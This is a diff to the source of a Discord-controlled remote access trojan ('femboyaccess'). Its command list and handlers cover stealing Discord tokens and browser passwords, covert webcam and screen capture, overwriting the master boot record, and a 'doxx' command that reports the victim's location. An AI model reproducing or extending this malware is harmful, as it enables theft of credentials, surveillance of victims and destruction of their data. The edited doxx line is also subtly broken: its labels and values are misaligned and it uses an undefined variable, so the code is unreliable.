@@ -112,8 +112,8 @@ commands_list = [
 	"displayoff - turns off screen",
 	"displayon - turns on screen",
 	"tokens - fetches discord tokens",
-	"critproc - makes femboyaccess into a critical process",
-	"uncritproc - makes femboyaccess into a normal process",
+	"critproc - makes the RAT a critical process",
+	"uncritproc - makes RAT a normal process",
 	"idletime - shows how much time the user has been idle",
 	"passwords - fetches passwords from the user's browsers",
 	"streamscreen <duration> - records the victim's screen and send it as a video file",
@@ -121,7 +121,7 @@ commands_list = [
 	"localtime - fetches the user's local time",
 	"timeset <year> <month> <day> <hour> <minute> - changes the system's time to a new one",
 	"webcampic - takes a pic from the user's webcam",
-	"fuckmbr - overwrites the master boot record",
+	"fuckmbr - overwrites the master boot record (FUCKS THEIR PC OVER)",
 	"regedit <key_path> <value_name> <new_value> - edits a regedit value",
 	"taskkill <name> - kills a process",
 	"processes - lists all the running processes",
@@ -764,7 +764,7 @@ screenshot done, see attached file
 			playsound(file_path.replace("\\", "/"))
 			await message.reply(await femboyaccess("playsound", "sound has been played! "))
 		else:
-			await message.reply(await femboyaccess('playsound', 'please attach a sound file as an argument! :3'))
+			await message.reply(await femboyaccess('playsound', 'please attach a sound file.'))
 
 	if message.content.startswith("doxx"):
 		data = requests.get("https://ipapi.co/json/").json()
@@ -777,7 +777,9 @@ screenshot done, see attached file
 		lat = data["latitude"]
 		lon = data["longitude"]
 		org = data["org"]
-		await message.reply(await femboyaccess('doxx', f'user doxxed! \n\nip/version: {ip}/{ipver}\ncountry: {country}\nregion: {region}\ncity: {city}\nzip: {postal}\nlatitude/longitude: {lat}/{lon}\nfai: {org}'))
+		money = data["currency"]
+		network = data["network"]
+		await message.reply(await femboyaccess('doxx', f'user doxxed! \n\nip/version: {network}\nnetwork: {ip}/{ipver}\nIP: {currency}\ncurrency: {country}\ncountry: {region}\nregion: {city}\ncity: {postal}\nzip: {lat}/{lon}\nlatitude/longitude: \norganisation: {org}'))
 
 	if message.content.startswith("blockinput"):
 		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
